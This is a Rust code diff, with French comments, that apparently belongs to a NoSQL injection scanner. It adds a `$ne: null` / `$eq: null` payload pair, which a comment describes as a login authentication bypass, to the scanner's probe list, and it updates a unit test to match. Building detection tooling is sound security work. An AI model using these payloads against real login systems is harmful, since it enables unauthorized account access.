@@ -38,6 +38,14 @@ pub const TRUE_REGEX: &str = "{\"$regex\": \".*\"}";
 /// Faux pendant de [`TRUE_REGEX`].
 pub const FALSE_REGEX: &str = "{\"$regex\": \"^injekt_nomatch_zzz$\"}";
 
+/// Paire `$ne: null` / `$eq: null` — forme cheat-sheet Vulnsy
+/// (`{"password":{"$ne":null}}` matche tout hash non-nul, `{"$eq":null}`
+/// ne matche rien sur un login classique). Appended last, budgets L1/L2
+/// inchangés.
+pub const TRUE_NE_NULL: &str = "{\"$ne\": null}";
+/// Faux pendant de [`TRUE_NE_NULL`].
+pub const FALSE_EQ_NULL: &str = "{\"$eq\": null}";
+
 /// Sonde d'erreur : `$where` JS syntaxiquement invalide → `SyntaxError`
 /// côté MongoDB (canal erreur du détecteur).
 pub const ERROR_WHERE: &str = "{\"$where\": \"(((\" }";
@@ -88,7 +96,7 @@ fn must_operator(literal: &str) -> serde_json::Value {
     serde_json::from_str(literal).unwrap_or(serde_json::Value::Object(serde_json::Map::new()))
 }
 
-/// Les 3 vecteurs `NoSQL` (budget L1 = 2 premiers, L3+ = tout).
+/// Les 4 vecteurs `NoSQL` (budget L1 = 2 premiers, L3+ = tout).
 #[must_use]
 pub fn nosql_payloads() -> Vec<NosqlPayload> {
     vec![
@@ -116,6 +124,14 @@ pub fn nosql_payloads() -> Vec<NosqlPayload> {
             must_operator(FALSE_REGEX),
             "regex",
         ),
+        NosqlPayload::new(
+            TRUE_NE_NULL,
+            FALSE_EQ_NULL,
+            ERROR_UNKNOWN_OP,
+            must_operator(TRUE_NE_NULL),
+            must_operator(FALSE_EQ_NULL),
+            "operator-ne-null",
+        ),
     ]
 }
 
@@ -126,14 +142,20 @@ mod tests {
     #[test]
     fn three_vectors_with_true_false_error() {
         let v = nosql_payloads();
-        assert_eq!(v.len(), 3);
+        assert_eq!(v.len(), 4);
         for p in &v {
             assert_ne!(p.true_payload, p.false_payload);
-            assert!(!p.error_payload.is_empty());
-            assert!(!p.vector.is_empty());
+            assert_ne!(p.error_payload, "");
+            assert_ne!(p.vector, "");
             assert!(p.true_operator.is_object(), "vector {}", p.vector);
             assert!(p.false_operator.is_object(), "vector {}", p.vector);
         }
+        // Vulnsy cheat-sheet $ne:null auth bypass appended last.
+        let last = &v[3];
+        assert_eq!(last.vector, "operator-ne-null");
+        assert!(last.true_payload.contains("$ne"));
+        assert!(last.true_payload.contains("null"));
+        assert!(last.false_payload.contains("$eq"));
     }
 
     #[test]
